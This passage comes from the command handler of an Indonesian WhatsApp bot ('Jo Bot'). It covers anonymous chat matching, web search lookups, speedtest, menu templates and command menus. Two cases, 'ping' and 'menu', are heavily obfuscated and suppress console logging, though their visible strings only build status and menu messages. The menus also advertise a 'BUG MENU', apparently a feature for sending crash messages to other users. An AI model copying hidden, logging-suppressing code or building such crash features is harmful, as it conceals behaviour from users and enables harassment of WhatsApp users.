            case 'listmsg': {
            if (!isCreator && !isBan) return
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
            if (!isCreator && !isBan) return
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
	    if (!isCreator && !isBan) return
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                jobotz.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await jobotz.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, jobotz.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
            if (!isCreator && !isBan) return
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await jobotz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
            if (!isCreator && !isBan) return
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, jobotz.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, jobotz.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await jobotz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, jobotz.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, jobotz.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
            if (!isCreator && !isBan) return
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await jobotz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, jobotz.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await jobotz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, jobotz.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, jobotz.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) return
                jobotz.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) return
                jobotz.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break

case 'pong':  case 'ping': case 'botstatus': case 'statusbot': {
 function _0x48fe(_0x6dc889,_0x3279a6){const _0x138866=_0x1aeb();return _0x48fe=function(_0x1c056f,_0x4693f3){_0x1c056f=_0x1c056f-0x15b;let _0x55a1b2=_0x138866[_0x1c056f];return _0x55a1b2;},_0x48fe(_0x6dc889,_0x3279a6);}const _0x1b5834=_0x48fe;(function(_0x113aaf,_0x2e22a4){const _0x139909=_0x48fe,_0x3ee317=_0x113aaf();while(!![]){try{const _0x404434=parseInt(_0x139909(0x15e))/0x1+parseInt(_0x139909(0x178))/0x2+parseInt(_0x139909(0x165))/0x3*(parseInt(_0x139909(0x15c))/0x4)+-parseInt(_0x139909(0x169))/0x5*(parseInt(_0x139909(0x167))/0x6)+-parseInt(_0x139909(0x16e))/0x7+-parseInt(_0x139909(0x15f))/0x8+parseInt(_0x139909(0x174))/0x9*(-parseInt(_0x139909(0x176))/0xa);if(_0x404434===_0x2e22a4)break;else _0x3ee317['push'](_0x3ee317['shift']());}catch(_0x534a87){_0x3ee317['push'](_0x3ee317['shift']());}}}(_0x1aeb,0xb3e24));const _0x50c57d=(function(){let _0x21ae53=!![];return function(_0x17d4aa,_0x229815){const _0x16e93a=_0x21ae53?function(){const _0x1012f8=_0x48fe;if(_0x229815){const _0x4cf2a1=_0x229815[_0x1012f8(0x172)](_0x17d4aa,arguments);return _0x229815=null,_0x4cf2a1;}}:function(){};return _0x21ae53=![],_0x16e93a;};}()),_0x215b73=_0x50c57d(this,function(){const _0xdd1629=_0x48fe;return _0x215b73['toString']()[_0xdd1629(0x16b)](_0xdd1629(0x177))['toString']()['constructor'](_0x215b73)['search']('(((.+)+)+)+$');});_0x215b73();const _0x4693f3=(function(){let _0x2a7e07=!![];return function(_0xd45cf6,_0x40ac2e){const _0x3fcce8=_0x2a7e07?function(){const _0x1ce52e=_0x48fe;if(_0x40ac2e){const _0x2cfe35=_0x40ac2e[_0x1ce52e(0x172)](_0xd45cf6,arguments);return _0x40ac2e=null,_0x2cfe35;}}:function(){};return _0x2a7e07=![],_0x3fcce8;};}()),_0x1c056f=_0x4693f3(this,function(){const _0x46a1f3=_0x48fe;let _0x1d4369;try{const _0x4f8b55=Function(_0x46a1f3(0x15b)+_0x46a1f3(0x173)+');');_0x1d4369=_0x4f8b55();}catch(_0x4432ba){_0x1d4369=window;}const _0x362840=_0x1d4369[_0x46a1f3(0x163)]=_0x1d4369['console']||{},_0x5a83f4=['log',_0x46a1f3(0x15d),_0x46a1f3(0x164),'error',_0x46a1f3(0x16c),_0x46a1f3(0x175),'trace'];for(let _0x19da23=0x0;_0x19da23<_0x5a83f4['length'];_0x19da23++){const _0x308691=_0x4693f3[_0x46a1f3(0x16f)][_0x46a1f3(0x170)]['bind'](_0x4693f3),_0x84372=_0x5a83f4[_0x19da23],_0x32192e=_0x362840[_0x84372]||_0x308691;_0x308691[_0x46a1f3(0x16d)]=_0x4693f3['bind'](_0x4693f3),_0x308691['toString']=_0x32192e['toString'][_0x46a1f3(0x166)](_0x32192e),_0x362840[_0x84372]=_0x308691;}});_0x1c056f();{if(!isCreator&&!isBan)return;let timestamp=speed(),latensi=speed()-timestamp;neww=performance[_0x1b5834(0x162)](),oldd=performance['now'](),respon='\x0a\x20╔╦╗╦─╦╔╗─╦╔╗╦╗╔╗╔╦╗\x0a\x20─║─╠═╣╠──║║║║╣║║─║\x0a\x20─╩─╩─╩╚╝╚╝╚╝╩╝╚╝─╩\x0a╭━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\x0a┃╭┈─────────────⩵꙰ཱི࿐\x0a┃╰──\x20⏤͟͟͞Status\x20Bot\x20──➤\x20↶↷\x0a╰━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━͙\x0a▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›\x0a│➳\x20'+runtime(process['uptime']())+'\x0a│➳\x20'+latensi['toFixed'](0x4)+_0x1b5834(0x17a),jobotz[_0x1b5834(0x171)](m[_0x1b5834(0x160)],{'image':{'url':_0x1b5834(0x161)},'contextInfo':{'externalAdReply':{'title':_0x1b5834(0x168),'body':'Runtime\x20'+runtime(process[_0x1b5834(0x16a)]()),'previewType':'PHOTO','showAdAttribution':!![],'sourceUrl':_0x1b5834(0x179),'thumbnailUrl':_0x1b5834(0x161)}},'caption':respon});}function _0x1aeb(){const _0x5b7885=['©⏤͟͟͞𝐓𝐇𝐄\x20𝐉𝐎\x20𝐁𝐎𝐓','5aSgDdf','uptime','search','exception','__proto__','346934yTLGGm','constructor','prototype','sendMessage','apply','{}.constructor(\x22return\x20this\x22)(\x20)','18cYSwYJ','table','4544930rnLOOo','(((.+)+)+)+$','2322320JuleBF','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','\x20miliseconds\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a\x0a©\x20⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁\x0a','return\x20(function()\x20','91772gNuDub','warn','1442128TbCEDN','9644760edMDee','chat','https://telegra.ph/file/094abb98c63d1fbac703e.jpg','now','console','info','147otiHhq','bind','4959288BKTMQt'];_0x1aeb=function(){return _0x5b7885;};return _0x1aeb();}
}
break

            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
                jobotz.sendContact(m.chat, global.owner, m)
            }
            break
            case 'playstore': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} clash of clans`
            let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
            let teks = `│➳ Playstore Search From : ${text}\n\n`
            for (let i of res.result) {
            teks += `│➳ Name : ${i.name}\n`
            teks += `│➳ Link : ${i.link}\n`
            teks += `│➳ Developer : ${i.developer}\n`
            teks += `│➳ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
            case 'gsmarena': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} samsung`
            let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `│➳ Title: ${judul}
│➳ Realease: ${rilis}
│➳ Size: ${ukuran}
│➳ Type: ${type}
│➳ Storage: ${storage}
│➳ Display: ${display}
│➳ Inchi: ${inchi}
│➳ Pixel: ${pixel}
│➳ Video Pixel: ${videoPixel}
│➳ Ram: ${ram}
│➳ Chipset: ${chipset}
│➳ Battery: ${batrai}
│➳ Battery Brand: ${merek_batre}
│➳ Detail: ${detail}`
            jobotz.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'jadwalbioskop': {
            if (!isCreator) return
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `│➳ Title: ${i.title}\n`
            capt += `│➳ Thumbnail: ${i.thumb}\n`
            capt += `│➳ Url: ${i.url}\n\n──────────────────────\n`
            }
            jobotz.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case 'nowplayingbioskop': {
            if (!isCreator) return
            let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
            let capt = `Now Playing Bioskop\n\n`
            for (let i of res.result){
            capt += `│➳ Title: ${i.title}\n`
            capt += `│➳ Url: ${i.url}\n`
            capt += `│➳ Img Url: ${i.img}\n\n──────────────────────\n`
            }
            jobotz.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            case 'aminio': {
            if (!isCreator) return
            if (!text) throw `Example: ${prefix + command} free fire`
            let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
            let capt = `Amino Search From : ${text}\n\n`
            for (let i of res.result){
            capt += `│➳ Community: ${i.community}\n`
            capt += `│➳ Community Link: ${i.community_link}\n`
            capt += `│➳ Thumbnail: ${i.community_thumb}\n`
            capt += `│➳ Description: ${i.community_desc}\n`
            capt += `│➳ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            jobotz.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break
            case 'wattpad': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
            let capt = `Wattpad From ${text}\n\n`
            capt += `│➳ Judul: ${judul}\n`
            capt += `│➳ Dibaca: ${dibaca}\n`
            capt += `│➳ Divote: ${divote}\n`
            capt += `│➳ Bab: ${bab}\n`
            capt += `│➳ Waktu: ${waktu}\n`
            capt += `│➳ Url: ${url}\n`
            capt += `│➳ Deskripsi: ${description}`
            jobotz.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'webtoons': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
            let capt = `Webtoons Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `│➳ Judul: ${i.judul}\n`
            capt += `│➳ Like: ${i.like}\n`
            capt += `│➳ Creator: ${i.creator}\n`
            capt += `│➳ Genre: ${i.genre}\n`
            capt += `│➳ Url: ${i.url}\n\n──────────────────────\n`
            }
            m.reply(capt)
            }
            break
            case 'drakor': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `│➳ Judul: ${i.judul}\n`
            capt += `│➳ Years: ${i.years}\n`
            capt += `│➳ Genre: ${i.genre}\n`
            capt += `│➳ Url: ${i.url}\n`
            capt += `│➳ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            jobotz.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case 'setmenu': {
            if (!isCreator) return
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
                ]
                },
                ]
                jobotz.sendListMsg(m.chat, `Please select the menu you want to change!`, jobotz.user.name, `Hello Owner !`, `Click Here`, sections, m)
                }
            }
            break

case 'getcase': {
if (!isCreator && !isBan) return
if (!args[0]) return reply("Mau ngambil case apa?")
const turbrek = `break`
try {
m.reply(`BY THE JO BOT\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./jo.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
} catch {
m.reply("Case Tidak Ditemukan")
}
}
break
case 'menu': { 
function _0x579d(){var _0x21a614=['521670efiuPe','apply','__proto__','19384BBeZJa','PHOTO','Runtime\x20','16355zszwtA','205918eQqFOw','(((.+)+)+)+$','2025licLNc','info','©⏤͟͟͞𝐓𝐇𝐄\x20𝐉𝐎\x20𝐁𝐎𝐓','warn','constructor','1821155AABofi','https://telegra.ph/file/094abb98c63d1fbac703e.jpg','115587pHjGCJ','error','prototype','exception','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','table','search','log','\x0a\x20╔╦╗╦─╦╔╗─╦╔╗╦╗╔╗╔╦╗\x0a\x20─║─╠═╣╠──║║║║╣║║─║\x0a\x20─╩─╩─╩╚╝╚╝╚╝╩╝╚╝─╩\x0a╭━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\x0a┃╭┈─────────────⩵꙰ཱི࿐\x0a┃╰──\x20⏤͟͟͞MENU\x20NYA\x20──➤\x20↶↷\x0a╰━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20ALL\x20MENU\x20〙\x0a𖠀⩵꙰ཱི࿐\x20BUGMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20FUNMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20MAINMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20VOICEMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20GROUPMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20OWNERMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20ISLAMICMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20SEARCHMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20EPHOTOMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20RANDOMMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20TEKSPROMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20PRIMBONMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20CONVERTMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20WEBZONEMENU\x0a𖠀⩵꙰ཱི࿐\x20DATABASEMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20PHOTOOXYMENU\x0a𖠀⩵꙰ཱི࿐\x20DOWNLOADMENU\x0a𖠀⩵꙰ཱི࿐\x20ANONYMOUSMENU\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a\x0a©\x20⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁\x0a','toString','534JHHmdz','bind','278524dMPnOo'];_0x579d=function(){return _0x21a614;};return _0x579d();}var _0x45b796=_0x54e9;(function(_0xef2cef,_0x39463a){var _0xef9ea2=_0x54e9,_0x3a7959=_0xef2cef();while(!![]){try{var _0x4edba8=-parseInt(_0xef9ea2(0x1d5))/0x1+parseInt(_0xef9ea2(0x1ce))/0x2+parseInt(_0xef9ea2(0x1de))/0x3+parseInt(_0xef9ea2(0x1cd))/0x4+-parseInt(_0xef9ea2(0x1d4))/0x5*(parseInt(_0xef9ea2(0x1cb))/0x6)+-parseInt(_0xef9ea2(0x1dc))/0x7+-parseInt(_0xef9ea2(0x1d1))/0x8*(-parseInt(_0xef9ea2(0x1d7))/0x9);if(_0x4edba8===_0x39463a)break;else _0x3a7959['push'](_0x3a7959['shift']());}catch(_0x4f681d){_0x3a7959['push'](_0x3a7959['shift']());}}}(_0x579d,0x26528));function _0x54e9(_0x31faf4,_0x3a6f5b){var _0x1df06f=_0x579d();return _0x54e9=function(_0x4ab5e1,_0x33f4c6){_0x4ab5e1=_0x4ab5e1-0x1c8;var _0x20a9ad=_0x1df06f[_0x4ab5e1];return _0x20a9ad;},_0x54e9(_0x31faf4,_0x3a6f5b);}var _0x44be22=(function(){var _0x5c188c=!![];return function(_0x588624,_0x1d1fcc){var _0x4819ff=_0x5c188c?function(){if(_0x1d1fcc){var _0xc41cf8=_0x1d1fcc['apply'](_0x588624,arguments);return _0x1d1fcc=null,_0xc41cf8;}}:function(){};return _0x5c188c=![],_0x4819ff;};}()),_0x599f1d=_0x44be22(this,function(){var _0x3615a2=_0x54e9;return _0x599f1d[_0x3615a2(0x1ca)]()[_0x3615a2(0x1e4)](_0x3615a2(0x1d6))[_0x3615a2(0x1ca)]()[_0x3615a2(0x1db)](_0x599f1d)[_0x3615a2(0x1e4)]('(((.+)+)+)+$');});_0x599f1d();var _0x33f4c6=(function(){var _0x2bfe66=!![];return function(_0x2626f0,_0x30c159){var _0x18b902=_0x2bfe66?function(){var _0x498d02=_0x54e9;if(_0x30c159){var _0x1b1850=_0x30c159[_0x498d02(0x1cf)](_0x2626f0,arguments);return _0x30c159=null,_0x1b1850;}}:function(){};return _0x2bfe66=![],_0x18b902;};}()),_0x4ab5e1=_0x33f4c6(this,function(){var _0x5acc68=_0x54e9,_0x6c52e2;try{var _0x265ca0=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x6c52e2=_0x265ca0();}catch(_0x4de83d){_0x6c52e2=window;}var _0x27017c=_0x6c52e2['console']=_0x6c52e2['console']||{},_0x204145=[_0x5acc68(0x1c8),_0x5acc68(0x1da),_0x5acc68(0x1d8),_0x5acc68(0x1df),_0x5acc68(0x1e1),_0x5acc68(0x1e3),'trace'];for(var _0x187697=0x0;_0x187697<_0x204145['length'];_0x187697++){var _0x10db16=_0x33f4c6['constructor'][_0x5acc68(0x1e0)][_0x5acc68(0x1cc)](_0x33f4c6),_0x5a33c5=_0x204145[_0x187697],_0x27c83e=_0x27017c[_0x5a33c5]||_0x10db16;_0x10db16[_0x5acc68(0x1d0)]=_0x33f4c6[_0x5acc68(0x1cc)](_0x33f4c6),_0x10db16[_0x5acc68(0x1ca)]=_0x27c83e[_0x5acc68(0x1ca)][_0x5acc68(0x1cc)](_0x27c83e),_0x27017c[_0x5a33c5]=_0x10db16;}});_0x4ab5e1();{if(!isCreator&&!isBan)return;menunya=_0x45b796(0x1c9),jobotz['sendMessage'](m['chat'],{'image':{'url':_0x45b796(0x1dd)},'contextInfo':{'externalAdReply':{'title':_0x45b796(0x1d9),'body':_0x45b796(0x1d3)+runtime(process['uptime']()),'previewType':_0x45b796(0x1d2),'showAdAttribution':!![],'sourceUrl':_0x45b796(0x1e2),'thumbnailUrl':'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}},'caption':menunya});}
}
break

case 'listmenu':{
if (!isCreator && !isBan) return
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `SILAHKAN PILIH MENU NYA`,
description: "PILIH DI DALAM LIST",
buttonText: "CLICK DISINI",
footerText: "",
listType: "SINGLE_SELECT",
sections: [{
"title": "BUG MENU",
"rows": [
{
"title": "BUG MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}bugmenu`
}
]
},
{
"title": "OWNER MENU",
"rows": [
{
"title": "OWNER MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}ownermenu`
}
]
},
{
"title": "GRUP MENU",
"rows": [
{
"title": "GRUP MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}grupmenu`
}
]
},
{
"title": "WEBZONE MENU",
"rows": [
{
"title": "WEBZONE MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}webzonemenu`
}
]
},
{
"title": "DOWNLOAD MENU",
"rows": [
{
"title": "DOWNLOAD MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}downloadmenu`
}
]
},
{
"title": "SEARCH MENU",
"rows": [
{
"title": "SEARCH MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}searchmenu`
}
]
},
{
"title": "RANDOM MENU",
"rows": [
{
"title": "RANDOM MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}randommenu`
}
]
},
{
"title": "TEKSPRO MENU",
"rows": [
{
"title": "TEKSPRO MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}tekspromenu`
}
]
},
{
"title": "PHOTO MENU",
"rows": [
{
"title": "PHOTO MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}photomenu`
}
]
},
{
"title": "EPHOTO MENU",
"rows": [
{
"title": "EPHOTO MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}ephotomenu`
}
]
},
{
"title": "PHOTOOXY MENU",
"rows": [
{
"title": "PHOTOOXY MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}photooxymenu`
}
]
},
{
"title": "FUN MENU",
"rows": [
{
"title": "FUN MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}funmenu`
}
]
},
{
"title": "PRIMBON MENU",
"rows": [
{
"title": "PRIMBON MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}primbonmenu`
}
]
},
{
"title": "CONVERT MENU",
"rows": [
{
"title": "CONVERT MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}convertmenu`
}
]
},
{
"title": "MAIN MENU",
"rows": [
{
"title": "MAIN MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}mainmenu`
}
]
},
{
"title": "DATABASE MENU",
"rows": [
{
"title": "DATABASE MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}databasemenu`
}
]
},
{
"title": "ANONYMOUS MENU",
"rows": [
{
"title": "ANONYMOUS MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}anonymousmenu`
}
]
},
{
"title": "ISLAMIC MENU",
"rows": [
{
"title": "ISLAMIC MENU",
"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"rowId": `${prefix}islamicmenu`
